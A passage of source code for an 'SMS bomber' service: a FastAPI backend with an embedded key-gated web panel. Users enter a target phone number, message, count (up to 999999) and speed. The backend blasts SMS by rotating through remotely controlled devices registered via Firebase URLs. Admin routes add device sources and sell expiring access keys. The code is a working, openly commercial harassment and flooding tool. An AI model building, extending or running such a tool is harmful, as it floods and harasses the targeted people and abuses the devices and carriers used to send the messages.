
.bg-glow {
  position: absolute;
  width: 300px;
  height: 300px;
  background: #1a4fcc;
  filter: blur(120px);
  border-radius: 50%;
  opacity:0.12;
  z-index: -1;
  animation: move 10s infinite alternate;
}

@keyframes move {
  from { transform: translate(-50%, -50%); }
  to { transform: translate(50%, 50%); }
}

.glass-card {
  width:100%;
  max-width:400px;
  background: rgba(18, 20, 28, 0.88);
  backdrop-filter: blur(15px);
  border:1px solid rgba(255,255,255,.06);
  border-radius:28px;
  padding:32px 26px 26px;
  box-shadow:0 30px 80px rgba(0,0,0,.5), inset 0 1px 0 rgba(255,255,255,.04);
  position:relative;
  overflow:hidden;
  transition:all 0.5s ease;
}

.glass-card::before {
  content:'';
  position:absolute;
  top:0;
  left:-100%;
  width:100%;
  height:2px;
  background:linear-gradient(90deg, transparent, #1a4fcc, transparent);
  animation:border-run 3s linear infinite;
}

@keyframes border-run {
  0% { left: -100%; }
  100% { left: 100%; }
}

.logo{text-align:center;margin-bottom:22px}
.logo .icon{
  width:54px;
  height:54px;
  margin:0 auto 12px;
  border-radius:16px;
  display:flex;
  align-items:center;
  justify-content:center;
  font-size:26px;
  background:linear-gradient(135deg,#22d3ee,#6366f1);
  box-shadow:0 10px 30px rgba(34,211,238,.25);
}
.logo h1{
  font-size:18px;
  font-weight:800;
  letter-spacing:.06em;
  line-height:1.3;
  font-family:'Orbitron',sans-serif;
  background:linear-gradient(90deg,#38bdf8,#818cf8,#e879f9);
  -webkit-background-clip:text;
  background-clip:text;
  color:transparent;
}
.logo p{
  margin-top:8px;
  font-size:10px;
  letter-spacing:.2em;
  color:#5b657a;
  font-weight:600;
  text-transform:uppercase;
  font-family:'Rajdhani',sans-serif;
}

.typing-text {
  color: #ffffff;
  font-family: 'Share Tech Mono', monospace;
  text-shadow: 0 0 8px rgba(255, 255, 255, 0.8), 0 0 15px rgba(59, 130, 246, 0.6);
  border-right: 2px solid #3b82f6;
  white-space: nowrap;
  overflow: hidden;
  display: inline-block;
  animation: typing 4s steps(30, end) infinite, blink-caret .75s step-end infinite;
}
@keyframes typing { from { width: 0 } to { width: 100% } }
@keyframes blink-caret { from, to { border-color: transparent } 50% { border-color: #3b82f6; } }

.input-group { position: relative; width: 100%; margin-bottom:14px; }
.input-group i {
  position: absolute;
  left: 15px;
  top: 50%;
  transform: translateY(-50%);
  color: #4a5568;
  transition: 0.3s;
  font-size:14px;
}

.input-style {
  width:100%;
  background: rgba(1, 1, 1, 0.5) !important;
  border: 1px solid rgba(255,255,255,.07) !important;
  padding: 14px 16px 14px 45px !important;
  transition: all 0.3s ease;
  font-size: 13px !important; 
  color: #e2e8f0 !important;
  font-family: 'JetBrains Mono', monospace;
  letter-spacing: 1px;
  border-radius:16px;
  outline:none;
}

.input-style::placeholder {
  font-family: 'Rajdhani', sans-serif;
  font-style: normal;
  letter-spacing: 2px;
  text-transform: uppercase;
  font-size: 11px;
  color: #4a5568 !important;
}

.input-style:focus {
  border-color: rgba(56,189,248,.45) !important;
  box-shadow: 0 0 0 3px rgba(56,189,248,.12);
  font-style: normal;
  color: #fff !important;
}

.btn-glow {
  width:100%;
  border:0;
  border-radius:999px;
  padding:16px 18px;
  font-size:13px;
  font-weight:700;
  cursor:pointer;
  font-family:'Orbitron',sans-serif;
  transition:transform .12s,opacity .12s;
  background:linear-gradient(45deg,#1a4fcc,#3b82f6);
  color:#fff;
  text-shadow:0 0 8px rgba(255,255,255,0.4);
  box-shadow:0 0 15px rgba(26,79,204,0.4);
  text-transform:uppercase;
  letter-spacing:2px;
}
.btn-glow:active{transform:scale(.98)}
.btn-glow:disabled{opacity:.6;cursor:not-allowed}
.btn-glow:hover{
  box-shadow:0 0 25px rgba(26,79,204,0.7);
  transform:translateY(-2px);
}

.alert{display:none;border-radius:14px;padding:12px 14px;font-size:13px;margin-bottom:14px;text-align:center;animation:fadeIn 0.4s ease}
.alert.show{display:block}
.alert.err{background:rgba(244,63,94,.12);border:1px solid rgba(244,63,94,.3);color:#fda4af}
.alert.ok{background:rgba(16,185,129,.12);border:1px solid rgba(16,185,129,.3);color:#6ee7b7}

@keyframes fadeIn {
  from { opacity: 0; transform: translateY(10px); }
  to { opacity: 1; transform: translateY(0); }
}

.hidden{display:none!important}

.powered{
  text-align:center;
  margin-top:18px;
  font-size:11px;
  color:#5b657a;
  font-family:'Rajdhani',sans-serif;
  letter-spacing:1px;
}
.powered a{
  color:#818cf8;
  text-decoration:none;
  font-weight:600;
  transition:0.3s;
}
.powered a:hover{
  color:#a78bfa;
  text-shadow:0 0 10px rgba(129,140,248,.3);
}

.social-link {
  transition: all 0.3s ease;
  color: #4a5568;
}
.social-link:hover {
  color: #fff;
  transform: translateY(-3px);
  filter: drop-shadow(0 0 5px #1a4fcc);
}

.footer-div {
  margin-top:20px;
  padding-top:16px;
  border-top:1px solid rgba(255,255,255,.05);
  text-align:center;
}
.footer-div .social-icons {
  display:flex;
  justify-content:center;
  gap:20px;
  margin-bottom:12px;
}
.footer-div .social-icons a {
  color:#4a5568;
  font-size:18px;
  transition:0.3s;
}
.footer-div .social-icons a:hover {
  color:#fff;
  transform:translateY(-3px);
  filter:drop-shadow(0 0 8px rgba(59,130,246,.4));
}

.cloudflare-badge {
  display: inline-flex;
  align-items: center;
  gap: 6px;
  color: #F38020;
  font-family: 'Orbitron', sans-serif;
  font-weight: bold;
  font-size: 9px;
  letter-spacing: 0.5px;
}
.cloudflare-badge svg {
  width: 16px;
  height: 16px;
}
.footer-text {
  color: #5b657a;
  font-size: 9px;
  text-transform: uppercase;
  letter-spacing: 0.5px;
  font-family:'Rajdhani',sans-serif;
}
.footer-text a {
  color: #00ffff;
  text-decoration: underline;
  font-weight: bold;
  transition:0.3s;
}
.footer-text a:hover {
  color:#fff;
}
</style>
</head>
<body>

<canvas id="starCanvas"></canvas>
<div class="bg-glow"></div>

<!-- GATE -->
<div class="glass-card" id="gate">
  <div class="logo">
    <h1>LUFFY COUSTOM SMS BOMBER</h1>
    <p><span class="typing-text">✦ PREMIUM ACCESS ✦</span></p>
  </div>
  
  <div id="gateAlert" class="alert"></div>
  
  <div class="input-group">
    <i class="fas fa-key"></i>
    <input class="input-style" id="gateKey" type="password" placeholder="Enter Access Key" autocomplete="off"/>
  </div>
  
  <button class="btn-glow" id="btnUnlock" type="button">
    <i class="fas fa-unlock-alt" style="margin-right:10px;"></i> Verify &amp; Continue
  </button>
  
  <div class="powered">Powered by <a href="https://t.me/LUFFY_49" target="_blank">@LUFFY_49</a></div>
  
  <div class="footer-div">
    <div class="social-icons">
      <a href="https://www.instagram.com/shubham_26x" target="_blank" class="social-link"><i class="fab fa-instagram"></i></a>
      <a href="https://t.me/LUFFY_49" target="_blank" class="social-link"><i class="fab fa-telegram"></i></a>
    </div>
    <div class="footer-text">
      <span class="cloudflare-badge">
        <svg viewBox="0 0 120 120" xmlns="http://www.w3.org/2000/svg">
          <defs><linearGradient id="cfGradient" x1="0%" y1="100%" x2="100%" y2="0%">
            <stop offset="0%" stop-color="#F38020"/>
            <stop offset="50%" stop-color="#FAAE40"/>
            <stop offset="100%" stop-color="#FBAE40"/>
          </linearGradient></defs>
          <path fill="url(#cfGradient)" d="M118.1 70.5c-1.1-4-4.1-7.3-7.9-8.9.1-1.3.2-2.7.2-4 0-14.7-11.9-26.6-26.6-26.6-5 0-9.7 1.4-13.8 3.8-5.7-10.3-16.6-17.3-29.2-17.3C22.6 17.5 7.9 32.2 7.9 50.4c0 2.1.2 4.1.6 6.1C3.1 59 0 64.2 0 70.1c0 8.7 7.1 15.8 15.8 15.8h101.4c1.6 0 2.9-1.3 2.9-2.9 0-4.3-.7-8.4-2-12.5z"/>
        </svg>
        CLOUDFLARE
      </span>
      <span style="color:#5b657a;margin:0 4px;">•</span>
      <a href="#" target="_blank">Terms</a>
      <span style="color:#5b657a;margin:0 4px;">•</span>
      <a href="#" target="_blank">Privacy</a>
    </div>
  </div>
</div>

<!-- APP (HIDDEN UNTIL UNLOCK) -->
<div id="app" class="hidden">
  <div class="glass-card" style="padding-top:20px">
    <div class="logo" style="margin-bottom:14px">
      <h1>LUFFY COUSTOM SMS BOMBER</h1>
      <p><span class="typing-text">✦ PANEL ACTIVE ✦</span></p>
    </div>
    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;gap:10px">
      <span style="font-size:11px;font-weight:700;padding:6px 14px;border-radius:999px;background:rgba(16,185,129,.12);border:1px solid rgba(16,185,129,.28);color:#6ee7b7;font-family:'Rajdhani',sans-serif;letter-spacing:1px;">
        <i class="fas fa-circle" style="color:#6ee7b7;font-size:8px;margin-right:6px;"></i>ACTIVE
      </span>
      <button style="width:auto;padding:8px 14px;font-size:11px;border-radius:999px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.08);color:#cbd5e1;cursor:pointer;font-family:'Rajdhani',sans-serif;font-weight:600;letter-spacing:1px;transition:0.3s;" id="btnLogout" type="button">
        <i class="fas fa-sign-out-alt" style="margin-right:6px;"></i>Logout
      </button>
    </div>
    <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:12px">
      <div style="background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.07);border-radius:16px;padding:12px;text-align:center">
        <b style="display:block;font-size:20px;color:#22d3ee;font-family:'Orbitron',sans-serif;" id="stDevices">—</b>
        <span style="font-size:9px;color:#7c879c;text-transform:uppercase;letter-spacing:.05em;font-family:'Rajdhani',sans-serif;">Devices</span>
      </div>
      <div style="background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.07);border-radius:16px;padding:12px;text-align:center">
        <b style="display:block;font-size:20px;color:#22d3ee;font-family:'Orbitron',sans-serif;" id="stFirebase">—</b>
        <span style="font-size:9px;color:#7c879c;text-transform:uppercase;letter-spacing:.05em;font-family:'Rajdhani',sans-serif;">Firebase</span>
      </div>
    </div>
    <div style="font-size:11px;color:#8b93a7;margin-bottom:4px;line-height:1.5;text-align:center;font-family:'Rajdhani',sans-serif;letter-spacing:0.5px;" id="keyMeta">
      <b style="color:#c7d2fe;">⚡ SYSTEM READY</b><br/>Premium Active
    </div>
  </div>

  <div class="glass-card">
    <h2 style="font-size:15px;margin-bottom:14px;font-family:'Orbitron',sans-serif;color:#fff;letter-spacing:1px;text-shadow:0 0 10px rgba(59,130,246,.2);">
      <i class="fas fa-bomb" style="color:#f43f5e;margin-right:10px;"></i>Start Bomb
    </h2>
    <div id="sendAlert" class="alert"></div>
    
    <div class="input-group">
      <i class="fas fa-phone"></i>
      <input class="input-style" id="number" type="tel" inputmode="numeric" placeholder="Target Number" style="padding-left:45px !important;"/>
    </div>
    
    <div class="input-group" style="margin-bottom:14px;">
      <i class="fas fa-comment" style="top:18px;transform:none;"></i>
      <textarea class="input-style" id="message" placeholder="Write your message" style="min-height:80px;resize:vertical;padding-top:14px !important;padding-left:45px !important;font-family:'Rajdhani',sans-serif;"></textarea>
    </div>
    
    <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:14px;">
      <div>
        <label style="display:block;font-size:10px;color:#7c879c;margin:0 0 6px;font-weight:600;text-transform:uppercase;letter-spacing:.05em;font-family:'Rajdhani',sans-serif;">
          <i class="fas fa-hashtag" style="margin-right:4px;"></i>Count
        </label>
        <input class="input-style" id="count" type="number" min="1" value="10" style="padding-left:15px !important;"/>
      </div>
      <div>
        <label style="display:block;font-size:10px;color:#7c879c;margin:0 0 6px;font-weight:600;text-transform:uppercase;letter-spacing:.05em;font-family:'Rajdhani',sans-serif;">
          <i class="fas fa-tachometer-alt" style="margin-right:4px;"></i>Speed
        </label>
        <select class="input-style" id="speed" style="padding-left:15px !important;cursor:pointer;appearance:auto;">
          <option value="slow">Slow</option>
          <option value="medium" selected>Medium</option>
                  </select>
      </div>
    </div>
    
    <button class="btn-glow" id="btnSend" type="button" style="background:linear-gradient(90deg,#e11d48,#f43f5e 50%,#fb7185);box-shadow:0 12px 28px rgba(244,63,94,.28);">
      <i class="fas fa-rocket" style="margin-right:10px;"></i> Launch Bomb
    </button>
  </div>
  
  <div class="powered">Powered by <a href="https://t.me/LUFFY_49" target="_blank">@LUFFY_49</a></div>
</div>

<script>
// ========== CONFIG (HIDDEN FROM UI) ==========
const API_BASE = window.location.origin;
const KEY_LS = "luffy_api_key";
const $ = (id) => document.getElementById(id);
function getApiKey(){ return (sessionStorage.getItem(KEY_LS) || "").trim(); }
function setApiKey(k){ sessionStorage.setItem(KEY_LS, k.trim()); }
function clearApiKey(){ sessionStorage.removeItem(KEY_LS); }

// ========== STAR BACKGROUND ==========
const canvas = document.getElementById('starCanvas');
const ctx = canvas.getContext('2d');
let stars = [];
function initStars() {
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;
  stars = [];
  for (let i = 0; i < 150; i++) {
    stars.push({
      x: Math.random() * canvas.width,
      y: Math.random() * canvas.height,
      size: Math.random() * 1.5,
      vx: (Math.random() - 0.5) * 2.5,
      vy: (Math.random() - 0.5) * 2.5
    });
  }
}
function drawStars() {
  ctx.clearRect(0, 0, canvas.width, canvas.height);
  ctx.fillStyle = '#ffffff';
  stars.forEach(star => {
    ctx.beginPath();
    ctx.arc(star.x, star.y, star.size, 0, Math.PI * 2);
    ctx.fill();
    star.x += star.vx;
    star.y += star.vy;
    if (star.x < 0) star.x = canvas.width;
    if (star.x > canvas.width) star.x = 0;
    if (star.y < 0) star.y = canvas.height;
    if (star.y > canvas.height) star.y = 0;
  });
  requestAnimationFrame(drawStars);
}
window.addEventListener('resize', initStars);
initStars();
drawStars();

// ========== AUDIO CLICK ==========
const clickAudio = new Audio('data:audio/wav;base64,UklGRl9vT19XQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YTdvT19vT19vT19vT19vT19vT19vT19vT19vT19vT19vT19vT19vT19vT19vT19vT19vT19vT19vT19vT19vT19vT19vT19vT19vT19vT19vT19vT19vT19vT19vT19vT19vT19vT19vT19vT19vT18=');
function playClick() {
  const soundClone = clickAudio.cloneNode();
  soundClone.volume = 0.4;
  soundClone.play().catch(() => {});
}
document.addEventListener('click', (e) => {
  if (e.target.tagName === 'INPUT' || e.target.tagName === 'BUTTON' || e.target.tagName === 'A' || e.target.closest('button') || e.target.closest('.input-group')) {
    playClick();
  }
});

// ========== GATE FUNCTIONS ==========
function showAlert(el, type, text) {
  el.className = "alert show " + type;
  el.textContent = text;
}
function hideAlert(el) {
  el.className = "alert";
  el.textContent = "";
}

// ========== LOAD STATS (SILENT - NO API INFO SHOWN) ==========
async function loadStats() {
  try {
    const res = await fetch(API_BASE + "/api/stats?api_key=" + encodeURIComponent(getApiKey()), {
      method: 'GET',
      headers: { 'Accept': 'application/json' }
    });
    
    if (!res.ok) {
      $("stDevices").textContent = "—";
      $("stFirebase").textContent = "—";
      return;
    }
    
    const data = await res.json().catch(() => ({}));
    
    if (data && data.ok !== false) {
      $("stDevices").textContent = data.devices_online ?? "—";
      $("stFirebase").textContent = data.firebase_count ?? "—";
    } else {
      $("stDevices").textContent = "—";
      $("stFirebase").textContent = "—";
    }
  } catch (e) {
    $("stDevices").textContent = "—";
    $("stFirebase").textContent = "—";
  }
}

function openApp() {
  $("gate").classList.add("hidden");
  $("app").classList.remove("hidden");
  loadStats();
}

$("btnUnlock").onclick = async () => {
  const key = $("gateKey").value.trim();
  hideAlert($("gateAlert"));
  if (!key) {
    showAlert($("gateAlert"), "err", "❌ Access key required");
    return;
  }
  $("btnUnlock").disabled = true;
  $("btnUnlock").innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:10px;"></i> Verifying…';
  try {
    const res = await fetch(API_BASE + "/api/keyinfo?api_key=" + encodeURIComponent(key));
    const data = await res.json().catch(() => ({}));
    if (!res.ok || data.ok === false) {
      showAlert($("gateAlert"), "err", "❌ " + (data.error || "Invalid or expired key"));
      return;
    }
    setApiKey(key);
    const info = data.key_info || {};
    openApp();
    const meta = document.getElementById("keyMeta");
    if (meta) {
      meta.innerHTML = "<b style=\"color:#c7d2fe\">" + (info.key_label || "USER") + "</b><br/>" +
        (info.remaining_text || info.key_status || "ACTIVE");
    }
  } catch (e) {
    showAlert($("gateAlert"), "err", "❌ Server unreachable");
  } finally {
    $("btnUnlock").disabled = false;
    $("btnUnlock").innerHTML = '<i class="fas fa-unlock-alt" style="margin-right:10px;"></i> Verify &amp; Continue';
  }
};

$("btnLogout").onclick = () => {
  clearApiKey();
  $("app").classList.add("hidden");
  $("gate").classList.remove("hidden");
  $("gateKey").value = "";
  hideAlert($("gateAlert"));
};

$("gateKey").addEventListener("keydown", (e) => {
  if (e.key === "Enter") $("btnUnlock").click();
});

// ========== SEND BOMB (WITHOUT EXPOSING API) ==========
$("btnSend").onclick = async () => {
  const number = $("number").value.trim().replace(/\s+/g, "");
  const message = $("message").value.trim();
  const count = parseInt($("count").value || "1", 10);
  const speed = $("speed").value || "medium";
  hideAlert($("sendAlert"));

  if (!number || number.length < 7) {
    showAlert($("sendAlert"), "err", "⚠️ Valid number required");
    return;
  }
  if (!message) {
    showAlert($("sendAlert"), "err", "⚠️ Message required");
    return;
  }
  if (!count || count < 1) {
    showAlert($("sendAlert"), "err", "⚠️ Invalid count");
    return;
  }

  $("btnSend").disabled = true;
  $("btnSend").innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:10px;"></i> Processing…';

  try {
    const url =
      API_BASE +
      "/api/send?api_key=" + encodeURIComponent(getApiKey()) +
      "&number=" + encodeURIComponent(number) +
      "&message=" + encodeURIComponent(message) +
      "&count=" + encodeURIComponent(count) +
      "&speed=" + encodeURIComponent(speed);

    const res = await fetch(url, { method: "GET" });
    
    if (!res.ok) {
      showAlert($("sendAlert"), "err", "⚠️ Server error — try again");
      return;
    }
    
    const data = await res.json().catch(() => ({}));

    if (data.ok === false) {
      showAlert($("sendAlert"), "err", data.error || "⚠️ Request failed");
      return;
    }

    showAlert(
      $("sendAlert"),
      "ok",
      "✅ " + (data.requested || count) + " SMS sent!"
    );
    loadStats(); // Silent update
  } catch (e) {
    showAlert($("sendAlert"), "err", "⚠️ Connection error — try again");
  } finally {
    $("btnSend").disabled = false;
    $("btnSend").innerHTML = '<i class="fas fa-rocket" style="margin-right:10px;"></i> Launch Bomb';
  }
};

// ========== SESSION CHECK ==========
(async () => {
  const k = getApiKey();
  if (!k) return;
  try {
    const res = await fetch(API_BASE + "/api/keyinfo?api_key=" + encodeURIComponent(k));
    const data = await res.json().catch(() => ({}));
    if (res.ok && data.ok !== false) {
      openApp();
      const info = data.key_info || {};
      const meta = document.getElementById("keyMeta");
      if (meta) meta.innerHTML = "<b style=\"color:#c7d2fe\">" + (info.key_label || "USER") + "</b><br/>" + (info.remaining_text || "ACTIVE");
    } else clearApiKey();
  } catch (e) {}
})();
</script>
</body>
</html>"""


@app.get("/panel", response_class=HTMLResponse)
@app.get("/app", response_class=HTMLResponse)
async def panel_page():
    return HTMLResponse(panel_html())


@app.get("/", response_class=HTMLResponse)
async def root(request: Request):
    """Premium landing page — refresh device count if cache empty."""
    global CACHED_DEVICES, LAST_SCAN
    d = load()
    fb_count = len(d.get("firebases", []))
    # Wake scan: if firebases exist but no devices yet, scan once (Render cold start)
    if fb_count and not CACHED_DEVICES:
        try:
            CACHED_DEVICES = await get_online_devices(d)
            LAST_SCAN = time.time()
        except Exception:
            pass
    devices = len(CACHED_DEVICES)
    total_sent = int(d.get("stats", {}).get("total_sent", 0) or 0)
    key_count = len(d.get("api_keys", []))
    if not fb_count:
        note = "Admin se Firebase add karo → /admin"
    elif devices == 0:
        note = "Devices scan ho rahe hain — page refresh karo (20–30 sec)"
    else:
        note = f"Last scan: {fmt_time(int(LAST_SCAN)) if LAST_SCAN else 'now'}"
    return HTMLResponse(home_html(devices, fb_count, total_sent, key_count, note))


@app.get("/api/info")
async def api_info(request: Request):
    ok, item, err = resolve_api_key(request)
    payload = {
        "service": "SMS Firebase API",
        "version": VERSION,
        "endpoints": {
            "GET /api/devices": "Online devices",
            "GET|POST /api/send": "Send SMS",
            "GET /api/stats": "Stats",
            "GET /api/keyinfo": "Key validity",
            "GET /api/info": "JSON status",
            "GET /admin": "Admin panel",
        },
        "devices_online": len(CACHED_DEVICES),
        "last_scan": fmt_time(int(LAST_SCAN)) if LAST_SCAN else None,
    }
    if not ok and (request.headers.get(API_KEY_HEADER) or request.query_params.get("api_key")):
        return api_json({"ok": False, "error": err, **payload}, item, 401)
    return api_json({"ok": True, **payload}, item)


@app.get("/api/keyinfo")
async def api_keyinfo(request: Request):
    ok, item, err = resolve_api_key(request)
    if not item and not request.headers.get(API_KEY_HEADER) and not request.query_params.get("api_key"):
        return api_json({"ok": False, "error": "Pass api_key to check validity"}, status=400)
    if not ok:
        return api_json({"ok": False, "error": err}, item, 401)
    return api_json({"ok": True}, item)


@app.get("/api/devices")
async def api_devices(request: Request):
    ok, item, err = resolve_api_key(request)
    if not ok:
        return api_json({"ok": False, "error": err}, item, 401)
    devices = [
        {"id": d["dev_id"], "name": d["name"], "fb": d.get("fb_label") or d.get("fb_id")}
        for d in CACHED_DEVICES
    ]
    return api_json({"ok": True, "count": len(devices), "devices": devices}, item)


@app.get("/api/stats")
async def api_stats(request: Request):
    ok, item, err = resolve_api_key(request)
    if not ok:
        return api_json({"ok": False, "error": err}, item, 401)
    d = load()
    return api_json({
        "ok": True,
        "devices_online": len(CACHED_DEVICES),
        "firebase_count": len(d.get("firebases", [])),
        "total_sent": d.get("stats", {}).get("total_sent", 0),
        "total_failed": d.get("stats", {}).get("total_failed", 0),
        "last_scan": fmt_time(int(LAST_SCAN)) if LAST_SCAN else None,
    }, item)


async def _do_blast(number: str, message: str, count: int, delay: float = SPEED_MEDIUM):
    """
    Same as bot run_sms_blast medium:
    - round-robin devices
    - PUT only (no isSended wait)
    - sleep(speed) after each SMS  [MEDIUM = 0.2]
    """
    d = load()
    devices = list(CACHED_DEVICES or await get_online_devices(d))
    if not devices:
        return 0, 0, 0

    # Clamp to bot-like speeds
    if delay <= 0.08:
        delay = SPEED_FAST
    elif delay <= 0.35:
        delay = SPEED_MEDIUM
    else:
        delay = min(delay, SPEED_SLOW)

    sent = failed = 0
    n_dev = len(devices)

    for i in range(count):
        # refresh device list occasionally
        if i > 0 and i % 40 == 0:
            fresh = CACHED_DEVICES
            if fresh:
                devices = list(fresh)
                n_dev = len(devices)
        if not devices:
            failed += count - i
            break

        dev = devices[i % len(devices)]
        # pick a SIM if device has sims list
        sim = dev.get("sim", 0) or 0
        ok = await send_sms(dev["fb_url"], dev["dev_id"], sim, number, message)
        if ok:
            sent += 1
        else:
            failed += 1

        # Bot style: sleep AFTER each send (except maybe last)
        if i < count - 1:
            await asyncio.sleep(delay)

    d = load()
    d["stats"]["total_sent"] = d["stats"].get("total_sent", 0) + sent
    d["stats"]["total_failed"] = d["stats"].get("total_failed", 0) + failed
    log_act(d, "api_send", f"{number} x{count} sent={sent} fail={failed} delay={delay}")
    save(d)
    return sent, failed, n_dev


@app.api_route("/api/send", methods=["GET", "POST"])
async def api_send(request: Request):
    ok, item, err = resolve_api_key(request)
    if not ok:
        return api_json({"ok": False, "error": err}, item, 401)

    data = {}
    if request.method == "POST":
        ctype = (request.headers.get("content-type") or "").lower()
        if "application/json" in ctype:
            try:
                data = await request.json()
            except Exception:
                data = {}
        else:
            try:
                form = await request.form()
                data = dict(form)
            except Exception:
                data = {}
    for k in ("number", "message", "count", "delay", "speed"):
        if k in request.query_params:
            data[k] = request.query_params.get(k)

    number = str(data.get("number", "")).strip().replace(" ", "").replace("+", "")
    message = str(data.get("message", "")).strip()
    try:
        count = int(float(str(data.get("count", 1) or 1)))
    except Exception:
        count = 1
    try:
        delay = float(str(data.get("delay", 0.2) or 0.2))
    except Exception:
        delay = SPEED_MEDIUM
    count = max(1, min(count, 999999))
    speed_name = str(data.get("speed", "")).strip().lower()
    if speed_name == "fast":
        delay = SPEED_FAST
    elif speed_name == "slow":
        delay = SPEED_SLOW
    elif speed_name == "medium":
        delay = SPEED_MEDIUM
    delay = max(0.05, min(delay, 2.0))

    if not number or len(number) < 7:
        return api_json({"ok": False, "error": "Valid number required"}, item, 400)
    if not message:
        return api_json({"ok": False, "error": "message required"}, item, 400)

    d = load()
    devices = CACHED_DEVICES or await get_online_devices(d)
    if not devices:
        return api_json({"ok": False, "error": "No online devices"}, item, 503)

    # Always queue — instant response for users; SMS continues in background
    asyncio.create_task(_do_blast(number, message, count, delay))
    log_act(d, "api_send_queued", f"{number} x{count}")
    save(d)
    return api_json({
        "ok": True,
        "status": "queued",
        "number": number,
        "message": message,
        "requested": count,
        "devices_online": len(devices),
        "note": "Request accepted. SMS background mein ja rahi hain.",
        "check_progress": "/api/stats",
    }, item)


@app.get("/admin/login", response_class=HTMLResponse)
async def admin_login_page(request: Request):
    if request.session.get("admin"):
        return RedirectResponse("/admin", status_code=303)
    return HTMLResponse(login_html())


@app.post("/admin/login")
async def admin_login(request: Request, password: str = Form(...)):
    if password == ADMIN_PASSWORD:
        request.session["admin"] = True
        return RedirectResponse("/admin", status_code=303)
    return HTMLResponse(login_html("Galat password!"), status_code=401)


@app.get("/admin/logout")
async def admin_logout(request: Request):
    request.session.pop("admin", None)
    return RedirectResponse("/admin/login", status_code=303)


@app.get("/admin", response_class=HTMLResponse)
async def admin_panel(request: Request):
    if not request.session.get("admin"):
        return RedirectResponse("/admin/login", status_code=303)
    global CACHED_DEVICES, LAST_SCAN
    d = load()
    # If firebases exist but devices 0, scan now so admin doesn't show 0
    if d.get("firebases") and not CACHED_DEVICES:
        try:
            CACHED_DEVICES = await get_online_devices(d)
            LAST_SCAN = time.time()
        except Exception:
            pass
    return HTMLResponse(admin_html(
        d, CACHED_DEVICES,
        fmt_time(int(LAST_SCAN)) if LAST_SCAN else "Never",
        dict(request.query_params),
    ))


@app.post("/admin/firebase/add")
async def admin_fb_add(request: Request, url: str = Form(...), label: str = Form("")):
    if not request.session.get("admin"):
        return RedirectResponse("/admin/login", status_code=303)
    d = load()
    added, skipped = add_firebases(d, [{"url": url, "label": label}])
    if skipped and not added:
        return RedirectResponse("/admin?dup=1", status_code=303)
    if added:
        log_act(d, "fb_add", url)
        save(d)
    return RedirectResponse("/admin", status_code=303)


@app.post("/admin/firebase/bulk")
async def admin_fb_bulk(
    request: Request,
    text: str = Form(""),
    file: UploadFile = File(None),
):
    if not request.session.get("admin"):
        return RedirectResponse("/admin/login", status_code=303)
    content = text or ""
    if file is not None and getattr(file, "filename", None):
        try:
            raw = await file.read()
            content += "\n" + raw.decode("utf-8", errors="ignore")
        except Exception:
            pass
    items = parse_firebase_lines(content)
    d = load()
    added, skipped = add_firebases(d, items)
    log_act(d, "fb_bulk", f"added={added} skip={skipped}")
    save(d)
    return RedirectResponse(f"/admin?bulk=1&bulk_added={added}&bulk_skip={skipped}", status_code=303)


@app.post("/admin/firebase/delete")
async def admin_fb_del(request: Request, fb_id: str = Form(...)):
    if not request.session.get("admin"):
        return RedirectResponse("/admin/login", status_code=303)
    d = load()
    d["firebases"] = [f for f in d.get("firebases", []) if f.get("id") != fb_id]
    save(d)
    return RedirectResponse("/admin", status_code=303)


@app.post("/admin/scan")
async def admin_scan(request: Request):
    if not request.session.get("admin"):
        return RedirectResponse("/admin/login", status_code=303)
    global CACHED_DEVICES, LAST_SCAN
    d = load()
    CACHED_DEVICES = await get_online_devices(d)
    LAST_SCAN = time.time()
    return RedirectResponse("/admin", status_code=303)


@app.post("/admin/apikey/create")
async def admin_key_create(
    request: Request,
    label: str = Form(...),
    custom_key: str = Form(...),
    amount: int = Form(1),
    unit: str = Form("lifetime"),
):
    if not request.session.get("admin"):
        return RedirectResponse("/admin/login", status_code=303)
    d = load()
    key = custom_key.strip()
    label = label.strip() or key
    if not key:
        return RedirectResponse("/admin", status_code=303)
    for item in d.get("api_keys", []):
        existing = item if isinstance(item, str) else item.get("key")
        if existing == key:
            return RedirectResponse("/admin?dup=1", status_code=303)

    duration, expires_at = calc_expires(unit, amount)
    d.setdefault("api_keys", []).append({
        "key": key,
        "label": label,
        "unit": unit,
        "amount": int(amount) if unit != "lifetime" else 0,
        "duration": duration,
        "expires_at": expires_at,
        "created_at": int(time.time()),
    })
    log_act(d, "api_key_create", f"{label}:{key}:{duration}")
    save(d)
    return RedirectResponse(f"/admin?newkey={key}", status_code=303)


@app.post("/admin/apikey/delete")
async def admin_key_del(request: Request, key: str = Form(...)):
    if not request.session.get("admin"):
        return RedirectResponse("/admin/login", status_code=303)
    d = load()
    new_keys = []
    for item in d.get("api_keys", []):
        if isinstance(item, str) and item != key:
            new_keys.append(item)
        elif isinstance(item, dict) and item.get("key") != key:
            new_keys.append(item)
    d["api_keys"] = new_keys
    save(d)
    return RedirectResponse("/admin", status_code=303)


@app.post("/admin/settings/apikey")
async def admin_toggle_key(request: Request, enabled: str = Form("0")):
    if not request.session.get("admin"):
        return RedirectResponse("/admin/login", status_code=303)
    d = load()
    d.setdefault("settings", {})["require_api_key"] = enabled == "1"
    save(d)
    return RedirectResponse("/admin", status_code=303)


@app.post("/admin/test-send")
async def admin_test_send(
    request: Request,
    number: str = Form(...),
    message: str = Form(...),
    count: int = Form(1),
):
    if not request.session.get("admin"):
        return RedirectResponse("/admin/login", status_code=303)
    d = load()
    devices = CACHED_DEVICES or await get_online_devices(d)
    count = max(1, min(int(count), 50))
    if not devices:
        return RedirectResponse("/admin?err=nodevice", status_code=303)
    sent = failed = 0
    for i in range(count):
        dev = devices[i % len(devices)]
        ok = await send_sms(dev["fb_url"], dev["dev_id"], dev.get("sim", 0), number.strip(), message.strip())
        sent += 1 if ok else 0
        failed += 0 if ok else 1
        await asyncio.sleep(0.25)
    d = load()
    d["stats"]["total_sent"] = d["stats"].get("total_sent", 0) + sent
